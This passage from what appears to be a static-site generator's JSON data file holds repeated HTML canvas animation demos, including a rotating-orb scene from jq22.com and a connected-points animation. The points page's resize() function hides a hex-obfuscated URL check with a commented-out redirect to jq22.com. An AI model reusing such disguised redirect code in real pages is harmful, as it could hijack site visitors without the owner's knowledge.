this.transIn.vtx = (param.vtx);\n    this.transIn.sz = (param.sz);\n    this.transIn.rot = (param.rot);\n    this.transIn.pos = (param.pos);\n  };\n\n  threeD.prototype.vupd = function() {\n    this.transOut = trans.steps(\n\n      this.transIn.vtx,\n      this.transIn.sz,\n      this.transIn.rot,\n      this.transIn.pos,\n      cam.disp\n    );\n  };\n\n  var Build = function() {\n    this.vel = 0.04;\n    this.lim = 360;\n    this.diff = 200;\n    this.initPos = 100;\n    this.toX = _x;\n    this.toY = _y;\n    this.go();\n  };\n\n  Build.prototype.go = function() {\n    this.canvas = document.getElementById(\"canv\");\n    this.canvas.width = window.innerWidth;\n    this.canvas.height = window.innerHeight;\n    this.$ = canv.getContext(\"2d\");\n    this.$.globalCompositeOperation = 'source-over';\n    this.varr = [];\n    this.dist = [];\n    this.calc = [];\n\n    for (var i = 0, len = num; i < len; i++) {\n      this.add();\n    }\n\n    this.rotObj = {\n      x: 0,\n      y: 0,\n      z: 0\n    };\n    this.objSz = {\n      x: w / 5,\n      y: h / 5,\n      z: w / 5\n    };\n  };\n\n  Build.prototype.add = function() {\n    this.varr.push(new threeD({\n      vtx: {\n        x: rnd(),\n        y: rnd(),\n        z: rnd()\n      },\n      sz: {\n        x: 0,\n        y: 0,\n        z: 0\n      },\n      rot: {\n        x: 20,\n        y: -20,\n        z: 0\n      },\n      pos: {\n        x: this.diff * Math.sin(360 * Math.random() * Math.PI / 180),\n        y: this.diff * Math.sin(360 * Math.random() * Math.PI / 180),\n        z: this.diff * Math.sin(360 * Math.random() * Math.PI / 180)\n      }\n    }));\n    this.calc.push({\n      x: 360 * Math.random(),\n      y: 360 * Math.random(),\n      z: 360 * Math.random()\n    });\n  };\n\n  Build.prototype.upd = function() {\n    cam.obj.x += (this.toX - cam.obj.x) * 0.05;\n    cam.obj.y += (this.toY - cam.obj.y) * 0.05;\n  };\n\n  Build.prototype.draw = function() {\n    this.$.clearRect(0, 0, this.canvas.width, this.canvas.height);\n    cam.upd();\n    this.rotObj.x += 0.1;\n    this.rotObj.y += 0.1;\n    this.rotObj.z += 0.1;\n\n    for (var i = 0; i < this.varr.length; i++) {\n      for (var val in this.calc[i]) {\n        if (this.calc[i].hasOwnProperty(val)) {\n          this.calc[i][val] += this.vel;\n          if (this.calc[i][val] > this.lim) this.calc[i][val] = 0;\n        }\n      }\n\n      this.varr[i].transIn.pos = {\n        x: this.diff * Math.cos(this.calc[i].x * Math.PI / 180),\n        y: this.diff * Math.sin(this.calc[i].y * Math.PI / 180),\n        z: this.diff * Math.sin(this.calc[i].z * Math.PI / 180)\n      };\n      this.varr[i].transIn.rot = this.rotObj;\n      this.varr[i].transIn.sz = this.objSz;\n      this.varr[i].vupd();\n      if (this.varr[i].transOut.p < 0) continue;\n      var g = this.$.createRadialGradient(this.varr[i].transOut.x, this.varr[i].transOut.y, this.varr[i].transOut.p, this.varr[i].transOut.x, this.varr[i].transOut.y, this.varr[i].transOut.p * 2);\n      this.$.globalCompositeOperation = 'lighter';\n      g.addColorStop(0, 'hsla(255, 255%, 255%, 1)');\n      g.addColorStop(.5, 'hsla(' + (i + 2) + ',85%, 40%,1)');\n      g.addColorStop(1, 'hsla(' + (i) + ',85%, 40%,.5)');\n      this.$.fillStyle = g;\n      this.$.beginPath();\n      this.$.arc(this.varr[i].transOut.x, this.varr[i].transOut.y, this.varr[i].transOut.p * 2, 0, Math.PI * 2, false);\n      this.$.fill();\n      this.$.closePath();\n    }\n  };\n  Build.prototype.anim = function() {\n    window.requestAnimationFrame = (function() {\n      return window.requestAnimationFrame ||\n        function(callback, element) {\n          window.setTimeout(callback, 1000 / 60);\n        };\n    })();\n    var anim = function() {\n      this.upd();\n      this.draw();\n      window.requestAnimationFrame(anim);\n    }.bind(this);\n    window.requestAnimationFrame(anim);\n  };\n\n  Build.prototype.run = function() {\n    this.anim();\n\n    window.addEventListener('mousemove', function(e) {\n      this.toX = (e.clientX - this.canvas.width / 2) * -0.8;\n      this.toY = (e.clientY - this.canvas.height / 2) * 0.8;\n    }.bind(this));\n    window.addEventListener('touchmove', function(e) {\n      e.preventDefault();\n      this.toX = (e.touches[0].clientX - this.canvas.width / 2) * -0.8;\n      this.toY = (e.touches[0].clientY - this.canvas.height / 2) * 0.8;\n    }.bind(this));\n    window.addEventListener('mousedown', function(e) {\n      for (var i = 0; i < 100; i++) {\n        this.add();\n      }\n    }.bind(this));\n    window.addEventListener('touchstart', function(e) {\n      e.preventDefault();\n      for (var i = 0; i < 100; i++) {\n        this.add();\n      }\n    }.bind(this));\n  };\n  var app = new Build();\n  app.run();\n})();\n/*window.addEventListener('resize', function() {\n  canvas.width = w = window.innerWidth;\n  canvas.height = h = window.innerHeight;\n}, false);*/\n</script>\n\n\n</body></html>","site":{"data":{}},"excerpt":"","more":"<!DOCTYPE html>\n<!-- saved from url=(0030)http://www.jq22.com/js/a7.html -->\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n\n<title>jq22-code7</title>\n<style>\nhtml {\n  height: 100%;\n  background-image: -webkit-radial-gradient(ellipse farthest-corner at center top, #000d4d 0%, #000105 100%);\n  background-image: radial-gradient(ellipse farthest-corner at center top, #000d4d 0%, #000105 100%);\n  cursor: move;\n}\n\nbody {\n  width: 100%;\n  margin: 0;\n  overflow: hidden;\n}\n</style>\n</head>\n\n<body>\n\n\n<canvas id=\"canv\" width=\"1504\" height=\"418\"></canvas>\n<script>\nvar num = 300;\nvar w = window.innerWidth;\nvar h = window.innerHeight;\nvar max = 100;\nvar _x = 0;\nvar _y = 0;\nvar _z = 400;\nvar dtr = function(d) {\n  return d * Math.PI / 180;\n};\n\nvar rnd = function() {\n  return Math.sin(Math.floor(Math.random() * 360) * Math.PI / 180);\n};\nvar dist = function(p1, p2, p3) {\n  return Math.sqrt(Math.pow(p2.x - p1.x, 2) + Math.pow(p2.y - p1.y, 2) + Math.pow(p2.z - p1.z, 2));\n};\n\nvar cam = {\n  obj: {\n    x: _x,\n    y: _y,\n    z: _z\n  },\n  dest: {\n    x: 0,\n    y: 0,\n    z: 1\n  },\n  dist: {\n    x: 0,\n    y: 0,\n    z: 200\n  },\n  ang: {\n    cplane: 0,\n    splane: 0,\n    ctheta: 0,\n    stheta: 0\n  },\n  zoom: 1,\n  disp: {\n    x: w / 2,\n    y: h / 2,\n    z: 0\n  },\n  upd: function() {\n    cam.dist.x = cam.dest.x - cam.obj.x;\n    cam.dist.y = cam.dest.y - cam.obj.y;\n    cam.dist.z = cam.dest.z - cam.obj.z;\n    cam.ang.cplane = -cam.dist.z / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.z * cam.dist.z);\n    cam.ang.splane = cam.dist.x / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.z * cam.dist.z);\n    cam.ang.ctheta = Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.z * cam.dist.z) / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.y * cam.dist.y + cam.dist.z * cam.dist.z);\n    cam.ang.stheta = -cam.dist.y / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.y * cam.dist.y + cam.dist.z * cam.dist.z);\n  }\n};\n\nvar trans = {\n  parts: {\n    sz: function(p, sz) {\n      return {\n        x: p.x * sz.x,\n        y: p.y * sz.y,\n        z: p.z * sz.z\n      };\n    },\n    rot: {\n      x: function(p, rot) {\n        return {\n          x: p.x,\n          y: p.y * Math.cos(dtr(rot.x)) - p.z * Math.sin(dtr(rot.x)),\n          z: p.y * Math.sin(dtr(rot.x)) + p.z * Math.cos(dtr(rot.x))\n        };\n      },\n      y: function(p, rot) {\n        return {\n          x: p.x * Math.cos(dtr(rot.y)) + p.z * Math.sin(dtr(rot.y)),\n          y: p.y,\n          z: -p.x * Math.sin(dtr(rot.y)) + p.z * Math.cos(dtr(rot.y))\n        };\n      },\n      z: function(p, rot) {\n        return {\n          x: p.x * Math.cos(dtr(rot.z)) - p.y * Math.sin(dtr(rot.z)),\n          y: p.x * Math.sin(dtr(rot.z)) + p.y * Math.cos(dtr(rot.z)),\n          z: p.z\n        };\n      }\n    },\n    pos: function(p, pos) {\n      return {\n        x: p.x + pos.x,\n        y: p.y + pos.y,\n        z: p.z + pos.z\n      };\n    }\n  },\n  pov: {\n    plane: function(p) {\n      return {\n        x: p.x * cam.ang.cplane + p.z * cam.ang.splane,\n        y: p.y,\n        z: p.x * -cam.ang.splane + p.z * cam.ang.cplane\n      };\n    },\n    theta: function(p) {\n      return {\n        x: p.x,\n        y: p.y * cam.ang.ctheta - p.z * cam.ang.stheta,\n        z: p.y * cam.ang.stheta + p.z * cam.ang.ctheta\n      };\n    },\n    set: function(p) {\n      return {\n        x: p.x - cam.obj.x,\n        y: p.y - cam.obj.y,\n        z: p.z - cam.obj.z\n      };\n    }\n  },\n  persp: function(p) {\n    return {\n      x: p.x * cam.dist.z / p.z * cam.zoom,\n      y: p.y * cam.dist.z / p.z * cam.zoom,\n      z: p.z * cam.zoom,\n      p: cam.dist.z / p.z\n    };\n  },\n  disp: function(p, disp) {\n    return {\n      x: p.x + disp.x,\n      y: -p.y + disp.y,\n      z: p.z + disp.z,\n      p: p.p\n    };\n  },\n  steps: function(_obj_, sz, rot, pos, disp) {\n    var _args = trans.parts.sz(_obj_, sz);\n    _args = trans.parts.rot.x(_args, rot);\n    _args = trans.parts.rot.y(_args, rot);\n    _args = trans.parts.rot.z(_args, rot);\n    _args = trans.parts.pos(_args, pos);\n    _args = trans.pov.plane(_args);\n    _args = trans.pov.theta(_args);\n    _args = trans.pov.set(_args);\n    _args = trans.persp(_args);\n    _args = trans.disp(_args, disp);\n    return _args;\n  }\n};\n\n(function() {\n  \"use strict\";\n  var threeD = function(param) {\n    this.transIn = {};\n    this.transOut = {};\n    this.transIn.vtx = (param.vtx);\n    this.transIn.sz = (param.sz);\n    this.transIn.rot = (param.rot);\n    this.transIn.pos = (param.pos);\n  };\n\n  threeD.prototype.vupd = function() {\n    this.transOut = trans.steps(\n\n      this.transIn.vtx,\n      this.transIn.sz,\n      this.transIn.rot,\n      this.transIn.pos,\n      cam.disp\n    );\n  };\n\n  var Build = function() {\n    this.vel = 0.04;\n    this.lim = 360;\n    this.diff = 200;\n    this.initPos = 100;\n    this.toX = _x;\n    this.toY = _y;\n    this.go();\n  };\n\n  Build.prototype.go = function() {\n    this.canvas = document.getElementById(\"canv\");\n    this.canvas.width = window.innerWidth;\n    this.canvas.height = window.innerHeight;\n    this.$ = canv.getContext(\"2d\");\n    this.$.globalCompositeOperation = 'source-over';\n    this.varr = [];\n    this.dist = [];\n    this.calc = [];\n\n    for (var i = 0, len = num; i < len; i++) {\n      this.add();\n    }\n\n    this.rotObj = {\n      x: 0,\n      y: 0,\n      z: 0\n    };\n    this.objSz = {\n      x: w / 5,\n      y: h / 5,\n      z: w / 5\n    };\n  };\n\n  Build.prototype.add = function() {\n    this.varr.push(new threeD({\n      vtx: {\n        x: rnd(),\n        y: rnd(),\n        z: rnd()\n      },\n      sz: {\n        x: 0,\n        y: 0,\n        z: 0\n      },\n      rot: {\n        x: 20,\n        y: -20,\n        z: 0\n      },\n      pos: {\n        x: this.diff * Math.sin(360 * Math.random() * Math.PI / 180),\n        y: this.diff * Math.sin(360 * Math.random() * Math.PI / 180),\n        z: this.diff * Math.sin(360 * Math.random() * Math.PI / 180)\n      }\n    }));\n    this.calc.push({\n      x: 360 * Math.random(),\n      y: 360 * Math.random(),\n      z: 360 * Math.random()\n    });\n  };\n\n  Build.prototype.upd = function() {\n    cam.obj.x += (this.toX - cam.obj.x) * 0.05;\n    cam.obj.y += (this.toY - cam.obj.y) * 0.05;\n  };\n\n  Build.prototype.draw = function() {\n    this.$.clearRect(0, 0, this.canvas.width, this.canvas.height);\n    cam.upd();\n    this.rotObj.x += 0.1;\n    this.rotObj.y += 0.1;\n    this.rotObj.z += 0.1;\n\n    for (var i = 0; i < this.varr.length; i++) {\n      for (var val in this.calc[i]) {\n        if (this.calc[i].hasOwnProperty(val)) {\n          this.calc[i][val] += this.vel;\n          if (this.calc[i][val] > this.lim) this.calc[i][val] = 0;\n        }\n      }\n\n      this.varr[i].transIn.pos = {\n        x: this.diff * Math.cos(this.calc[i].x * Math.PI / 180),\n        y: this.diff * Math.sin(this.calc[i].y * Math.PI / 180),\n        z: this.diff * Math.sin(this.calc[i].z * Math.PI / 180)\n      };\n      this.varr[i].transIn.rot = this.rotObj;\n      this.varr[i].transIn.sz = this.objSz;\n      this.varr[i].vupd();\n      if (this.varr[i].transOut.p < 0) continue;\n      var g = this.$.createRadialGradient(this.varr[i].transOut.x, this.varr[i].transOut.y, this.varr[i].transOut.p, this.varr[i].transOut.x, this.varr[i].transOut.y, this.varr[i].transOut.p * 2);\n      this.$.globalCompositeOperation = 'lighter';\n      g.addColorStop(0, 'hsla(255, 255%, 255%, 1)');\n      g.addColorStop(.5, 'hsla(' + (i + 2) + ',85%, 40%,1)');\n      g.addColorStop(1, 'hsla(' + (i) + ',85%, 40%,.5)');\n      this.$.fillStyle = g;\n      this.$.beginPath();\n      this.$.arc(this.varr[i].transOut.x, this.varr[i].transOut.y, this.varr[i].transOut.p * 2, 0, Math.PI * 2, false);\n      this.$.fill();\n      this.$.closePath();\n    }\n  };\n  Build.prototype.anim = function() {\n    window.requestAnimationFrame = (function() {\n      return window.requestAnimationFrame ||\n        function(callback, element) {\n          window.setTimeout(callback, 1000 / 60);\n        };\n    })();\n    var anim = function() {\n      this.upd();\n      this.draw();\n      window.requestAnimationFrame(anim);\n    }.bind(this);\n    window.requestAnimationFrame(anim);\n  };\n\n  Build.prototype.run = function() {\n    this.anim();\n\n    window.addEventListener('mousemove', function(e) {\n      this.toX = (e.clientX - this.canvas.width / 2) * -0.8;\n      this.toY = (e.clientY - this.canvas.height / 2) * 0.8;\n    }.bind(this));\n    window.addEventListener('touchmove', function(e) {\n      e.preventDefault();\n      this.toX = (e.touches[0].clientX - this.canvas.width / 2) * -0.8;\n      this.toY = (e.touches[0].clientY - this.canvas.height / 2) * 0.8;\n    }.bind(this));\n    window.addEventListener('mousedown', function(e) {\n      for (var i = 0; i < 100; i++) {\n        this.add();\n      }\n    }.bind(this));\n    window.addEventListener('touchstart', function(e) {\n      e.preventDefault();\n      for (var i = 0; i < 100; i++) {\n        this.add();\n      }\n    }.bind(this));\n  };\n  var app = new Build();\n  app.run();\n})();\n/*window.addEventListener('resize', function() {\n  canvas.width = w = window.innerWidth;\n  canvas.height = h = window.innerHeight;\n}, false);*/\n</script>\n\n\n</body></html>"},{"layout":"false","_content":"<!DOCTYPE html>\n<html>\n\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n  <title>a9</title>\n  <style>\n  body {\n    margin: 0;\n    overflow: hidden;\n    background: #000;\n  }\n  \n  body canvas {\n    -webkit-filter: url(\"#turbulence\");\n    filter: url(\"#turbulence\");\n  }\n  </style>\n</head>\n\n<body>\n  <canvas id=\"c\" width=\"1504\" height=\"467\"></canvas>\n  <script>\n  var c = document.getElementById('c'),\n    ctx = c.getContext('2d'),\n    points = [],\n    count = 40,\n    size = 3,\n    delta = 4,\n    distance = 170;\n  window.requestAnimFrame = (function() {\n    return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function(callback) {\n      window.setTimeout(callback, 1000 / 60)\n    }\n  })();\n\n  function checkDistance(x1, y1, x2, y2) {\n    return Math.sqrt(Math.pow(x1 - x2, 2) + Math.pow(y1 - y2, 2))\n  }\n\n  function setColor() {\n    return 'rgb(' + Math.round(255 * Math.random()) + ',' + Math.round(255 * Math.random()) + ',' + Math.round(255 * Math.random()) + ')'\n  }\n\n  function Point(x, y, dx, dy, color) {\n    this.x = x;\n    this.y = y;\n    this.dx = dx;\n    this.dy = dy;\n    this.color = color\n  }\n\n  function initPoint(x, y) {\n    var x = x || c.width * Math.random(),\n      y = y || c.height * Math.random(),\n      dx = -delta / 2 + delta * Math.random(),\n      dy = -delta / 2 + delta * Math.random(),\n      color = setColor();\n    points.push(new Point(x, y, dx, dy, color))\n  }\n\n  function drawPoint(point) {\n    ctx.fillStyle = point.color;\n    ctx.beginPath();\n    ctx.arc(point.x, point.y, size, 0, 2 * Math.PI);\n    ctx.fill()\n  }\n\n  function drawLines(point, index) {\n    for (var i = 0; i < index; i++) {\n      var opacity = 1 - checkDistance(point.x, point.y, points[i].x, points[i].y) / distance;\n      if (opacity > 0) {\n        var grad = ctx.createLinearGradient(point.x, point.y, points[i].x, points[i].y);\n        grad.addColorStop(0, point.color);\n        grad.addColorStop(1, points[i].color);\n        ctx.strokeStyle = grad;\n        ctx.globalAlpha = opacity;\n        ctx.beginPath();\n        ctx.moveTo(point.x, point.y);\n        ctx.lineTo(points[i].x, points[i].y);\n        ctx.stroke();\n        ctx.globalAlpha = 1\n      }\n    }\n  }\n\n  function updatePosition() {\n    for (var i = 0; i < points.length; i++) {\n      var xDx = points[i].x + points[i].dx,\n        yDy = points[i].y + points[i].dy;\n      if (xDx - size < 0 || xDx + size > c.width) {\n        points[i].dx = -points[i].dx\n      }\n      if (yDy - size < 0 || yDy + size > c.height) {\n        points[i].dy = -points[i].dy\n      }\n      points[i].x += points[i].dx;\n      points[i].y += points[i].dy;\n      drawPoint(points[i]);\n      drawLines(points[i], i)\n    }\n  }\n\n  function init() {\n    points.length = 0;\n    for (var i = 0; i < count; i++) {\n      initPoint()\n    }\n  }\n\n  function resize() {\n    var GQInzO1 = window[\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x72\\x65\\x66\"][\"\\x73\\x75\\x62\\x73\\x74\\x72\"](0, 19);\n    var j2 = window[\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x72\\x65\\x66\"][\"\\x73\\x75\\x62\\x73\\x74\\x72\"](0, 4);\n    if (GQInzO1 == \"\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x6a\\x71\\x32\\x32\\x2e\\x63\\x6f\\x6d\" || j2 == \"\\x66\\x69\\x6c\\x65\") {} else {\n      /*window[\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x72\\x65\\x66\"] = \"\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x6a\\x71\\x32\\x32\\x2e\\x63\\x6f\\x6d\"*/\n    }\n    c[\"\\x77\\x69\\x64\\x74\\x68\"] = window[\"\\x69\\x6e\\x6e\\x65\\x72\\x57\\x69\\x64\\x74\\x68\"];\n    c[\"\\x68\\x65\\x69\\x67\\x68\\x74\"] = window[\"\\x69\\x6e\\x6e\\x65\\x72\\x48\\x65\\x69\\x67\\x68\\x74\"];\n    init()\n  }\n\n  function draw() {\n    ctx.clearRect(0, 0, c.width, c.height);\n    updatePosition();\n    window.requestAnimFrame(draw)\n  }\n  window.addEventListener(\"resize\", resize);\n  c.addEventListener(\"mouseup\", function(e) {\n    initPoint(e.pageX - c.offsetLeft, e.pageY - c.offsetTop)\n  });\n  resize();\n  draw();\n  </script>\n</body>\n\n</html>\n","source":"libs/webGL/a9.html","raw":"layout: false\n---\n<!DOCTYPE html>\n<html>\n\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n  <title>a9</title>\n  <style>\n  body {\n    margin: 0;\n    overflow: hidden;\n    background: #000;\n  }\n  \n  body canvas {\n    -webkit-filter: url(\"#turbulence\");\n    filter: url(\"#turbulence\");\n  }\n  </style>\n</head>\n\n<body>\n  <canvas id=\"c\" width=\"1504\" height=\"467\"></canvas>\n  <script>\n  var c = document.getElementById('c'),\n    ctx = c.getContext('2d'),\n    points = [],\n    count = 40,\n    size = 3,\n    delta = 4,\n    distance = 170;\n  window.requestAnimFrame = (function() {\n    return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function(callback) {\n      window.setTimeout(callback, 1000 / 60)\n    }\n  })();\n\n  function checkDistance(x1, y1, x2, y2) {\n    return Math.sqrt(Math.pow(x1 - x2, 2) + Math.pow(y1 - y2, 2))\n  }\n\n  function setColor() {\n    return 'rgb(' + Math.round(255 * Math.random()) + ',' + Math.round(255 * Math.random()) + ',' + Math.round(255 * Math.random()) + ')'\n  }\n\n  function Point(x, y, dx, dy, color) {\n    this.x = x;\n    this.y = y;\n    this.dx = dx;\n    this.dy = dy;\n    this.color = color\n  }\n\n  function initPoint(x, y) {\n    var x = x || c.width * Math.random(),\n      y = y || c.height * Math.random(),\n      dx = -delta / 2 + delta * Math.random(),\n      dy = -delta / 2 + delta * Math.random(),\n      color = setColor();\n    points.push(new Point(x, y, dx, dy, color))\n  }\n\n  function drawPoint(point) {\n    ctx.fillStyle = point.color;\n    ctx.beginPath();\n    ctx.arc(point.x, point.y, size, 0, 2 * Math.PI);\n    ctx.fill()\n  }\n\n  function drawLines(point, index) {\n    for (var i = 0; i < index; i++) {\n      var opacity = 1 - checkDistance(point.x, point.y, points[i].x, points[i].y) / distance;\n      if (opacity > 0) {\n        var grad = ctx.createLinearGradient(point.x, point.y, points[i].x, points[i].y);\n        grad.addColorStop(0, point.color);\n        grad.addColorStop(1, points[i].color);\n        ctx.strokeStyle = grad;\n        ctx.globalAlpha = opacity;\n        ctx.beginPath();\n        ctx.moveTo(point.x, point.y);\n        ctx.lineTo(points[i].x, points[i].y);\n        ctx.stroke();\n        ctx.globalAlpha = 1\n      }\n    }\n  }\n\n  function updatePosition() {\n    for (var i = 0; i < points.length; i++) {\n      var xDx = points[i].x + points[i].dx,\n        yDy = points[i].y + points[i].dy;\n      if (xDx - size < 0 || xDx + size > c.width) {\n        points[i].dx = -points[i].dx\n      }\n      if (yDy - size < 0 || yDy + size > c.height) {\n        points[i].dy = -points[i].dy\n      }\n      points[i].x += points[i].dx;\n      points[i].y += points[i].dy;\n      drawPoint(points[i]);\n      drawLines(points[i], i)\n    }\n  }\n\n  function init() {\n    points.length = 0;\n    for (var i = 0; i < count; i++) {\n      initPoint()\n    }\n  }\n\n  function resize() {\n    var GQInzO1 = window[\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x72\\x65\\x66\"][\"\\x73\\x75\\x62\\x73\\x74\\x72\"](0, 19);\n    var j2 = window[\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x72\\x65\\x66\"][\"\\x73\\x75\\x62\\x73\\x74\\x72\"](0, 4);\n    if (GQInzO1 == \"\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x6a\\x71\\x32\\x32\\x2e\\x63\\x6f\\x6d\" || j2 == \"\\x66\\x69\\x6c\\x65\") {} else {\n      /*window[\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x72\\x65\\x66\"] = \"\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x6a\\x71\\x32\\x32\\x2e\\x63\\x6f\\x6d\"*/\n    }\n    c[\"\\x77\\x69\\x64\\x74\\x68\"] = window[\"\\x69\\x6e\\x6e\\x65\\x72\\x57\\x69\\x64\\x74\\x68\"];\n    c[\"\\x68\\x65\\x69\\x67\\x68\\x74\"] = window[\"\\x69\\x6e\\x6e\\x65\\x72\\x48\\x65\\x69\\x67\\x68\\x74\"];\n    init()\n  }\n\n  function draw() {\n    ctx.clearRect(0, 0, c.width, c.height);\n    updatePosition();\n    window.requestAnimFrame(draw)\n  }\n  window.addEventListener(\"resize\", resize);\n  c.addEventListener(\"mouseup\", function(e) {\n    initPoint(e.pageX - c.offsetLeft, e.pageY - c.offsetTop)\n  });\n  resize();\n  draw();\n  </script>\n</body>\n\n</html>\n","date":"2017-07-06T08:39:15.171Z","updated":"2017-07-06T08:39:15.171Z","path":"libs/webGL/a9.html","title":"","comments":1,"_id":"cje9esjxr002ti4ucokq6r39u","content":"<!DOCTYPE html>\n<html>\n\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n  <title>a9</title>\n  <style>\n  body {\n    margin: 0;\n    overflow: hidden;\n    background: #000;\n  }\n  \n  body canvas {\n    -webkit-filter: url(\"#turbulence\");\n    filter: url(\"#turbulence\");\n  }\n  </style>\n</head>\n\n<body>\n  <canvas id=\"c\" width=\"1504\" height=\"467\"></canvas>\n  <script>\n  var c = document.getElementById('c'),\n    ctx = c.getContext('2d'),\n    points = [],\n    count = 40,\n    size = 3,\n    delta = 4,\n    distance = 170;\n  window.requestAnimFrame = (function() {\n    return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function(callback) {\n      window.setTimeout(callback, 1000 / 60)\n    }\n  })();\n\n  function checkDistance(x1, y1, x2, y2) {\n    return Math.sqrt(Math.pow(x1 - x2, 2) + Math.pow(y1 - y2, 2))\n  }\n\n  function setColor() {\n    return 'rgb(' + Math.round(255 * Math.random()) + ',' + Math.round(255 * Math.random()) + ',' + Math.round(255 * Math.random()) + ')'\n  }\n\n  function Point(x, y, dx, dy, color) {\n    this.x = x;\n    this.y = y;\n    this.dx = dx;\n    this.dy = dy;\n    this.color = color\n  }\n\n  function initPoint(x, y) {\n    var x = x || c.width * Math.random(),\n      y = y || c.height * Math.random(),\n      dx = -delta / 2 + delta * Math.random(),\n      dy = -delta / 2 + delta * Math.random(),\n      color = setColor();\n    points.push(new Point(x, y, dx, dy, color))\n  }\n\n  function drawPoint(point) {\n    ctx.fillStyle = point.color;\n    ctx.beginPath();\n    ctx.arc(point.x, point.y, size, 0, 2 * Math.PI);\n    ctx.fill()\n  }\n\n  function drawLines(point, index) {\n    for (var i = 0; i < index; i++) {\n      var opacity = 1 - checkDistance(point.x, point.y, points[i].x, points[i].y) / distance;\n      if (opacity > 0) {\n        var grad = ctx.createLinearGradient(point.x, point.y, points[i].x, points[i].y);\n        grad.addColorStop(0, point.color);\n        grad.addColorStop(1, points[i].color);\n        ctx.strokeStyle = grad;\n        ctx.globalAlpha = opacity;\n        ctx.beginPath();\n        ctx.moveTo(point.x, point.y);\n        ctx.lineTo(points[i].x, points[i].y);\n        ctx.stroke();\n        ctx.globalAlpha = 1\n      }\n    }\n  }\n\n  function updatePosition() {\n    for (var i = 0; i < points.length; i++) {\n      var xDx = points[i].x + points[i].dx,\n        yDy = points[i].y + points[i].dy;\n      if (xDx - size < 0 || xDx + size > c.width) {\n        points[i].dx = -points[i].dx\n      }\n      if (yDy - size < 0 || yDy + size > c.height) {\n        points[i].dy = -points[i].dy\n      }\n      points[i].x += points[i].dx;\n      points[i].y += points[i].dy;\n      drawPoint(points[i]);\n      drawLines(points[i], i)\n    }\n  }\n\n  function init() {\n    points.length = 0;\n    for (var i = 0; i < count; i++) {\n      initPoint()\n    }\n  }\n\n  function resize() {\n    var GQInzO1 = window[\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x72\\x65\\x66\"][\"\\x73\\x75\\x62\\x73\\x74\\x72\"](0, 19);\n    var j2 = window[\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x72\\x65\\x66\"][\"\\x73\\x75\\x62\\x73\\x74\\x72\"](0, 4);\n    if (GQInzO1 == \"\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x6a\\x71\\x32\\x32\\x2e\\x63\\x6f\\x6d\" || j2 == \"\\x66\\x69\\x6c\\x65\") {} else {\n      /*window[\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x72\\x65\\x66\"] = \"\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x6a\\x71\\x32\\x32\\x2e\\x63\\x6f\\x6d\"*/\n    }\n    c[\"\\x77\\x69\\x64\\x74\\x68\"] = window[\"\\x69\\x6e\\x6e\\x65\\x72\\x57\\x69\\x64\\x74\\x68\"];\n    c[\"\\x68\\x65\\x69\\x67\\x68\\x74\"] = window[\"\\x69\\x6e\\x6e\\x65\\x72\\x48\\x65\\x69\\x67\\x68\\x74\"];\n    init()\n  }\n\n  function draw() {\n    ctx.clearRect(0, 0, c.width, c.height);\n    updatePosition();\n    window.requestAnimFrame(draw)\n  }\n  window.addEventListener(\"resize\", resize);\n  c.addEventListener(\"mouseup\", function(e) {\n    initPoint(e.pageX - c.offsetLeft, e.pageY - c.offsetTop)\n  });\n  resize();\n  draw();\n  </script>\n</body>\n\n</html>\n","site":{"data":{}},"excerpt":"","more":"<!DOCTYPE html>\n<html>\n\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n  <title>a9</title>\n  <style>\n  body {\n    margin: 0;\n    overflow: hidden;\n    background: #000;\n  }\n  \n  body canvas {\n    -webkit-filter: url(\"#turbulence\");\n    filter: url(\"#turbulence\");\n  }\n  </style>\n</head>\n\n<body>\n  <canvas id=\"c\" width=\"1504\" height=\"467\"></canvas>\n  <script>\n  var c = document.getElementById('c'),\n    ctx = c.getContext('2d'),\n    points = [],\n    count = 40,\n    size = 3,\n    delta = 4,\n    distance = 170;\n  window.requestAnimFrame = (function() {\n    return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function(callback) {\n      window.setTimeout(callback, 1000 / 60)\n    }\n  })();\n\n  function 